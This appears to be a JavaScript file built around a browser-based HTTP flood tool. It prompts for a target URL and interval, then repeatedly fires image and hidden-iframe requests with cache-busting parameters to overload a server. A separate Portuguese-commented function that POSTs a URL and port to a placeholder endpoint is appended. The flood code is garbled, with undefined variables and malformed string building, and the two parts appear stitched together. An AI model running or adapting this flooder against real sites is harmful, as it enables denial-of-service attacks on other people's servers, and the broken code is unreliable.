var target = prompt("Image Url, add / to the end");
var speed = prompt("Make request ever [blank] miliseconds");
var msg = prompt("Message to HTTP server");

function attack() {  
  var pic = new Image();
  var rand1 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
  var rand2 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
  pic.src = 'http://'+target+"/?r="+rand;
    
    document.body.innerHTML+='<iframe src='+target+'?daKillaOfZeeCache="'+rand1+ +' &msg= '+ msg + '"style="display:none;"></iframe>';
  

                    img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
					img.setAttribute("src", targetURL + "?killinAllThatCacheYeah=" + rand2 + "&msg=" + msg);

}
setInterval(attack, speed);  

function sendData() {
  // Obter os valores dos campos de entrada (URL e porta)
  const url = document.getElementById('url').value;
  const port = document.getElementById('port').value;

  // Dados que serão enviados para o servidor no corpo da solicitação
  const data = {
    url: url,
    port: port
  };

  // Configuração da solicitação POST
  const requestOptions = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  };

  // Fazer a solicitação POST para o servidor
  fetch('/seu_endpoint_aqui', requestOptions)
    .then(response => response.json())
    .then(data => {
      // Aqui você pode lidar com a resposta do servidor, se houver alguma
      console.log('Resposta do servidor:', data);
    })
    .catch(error => {
      console.error('Erro ao enviar os dados:', error);
    });
}
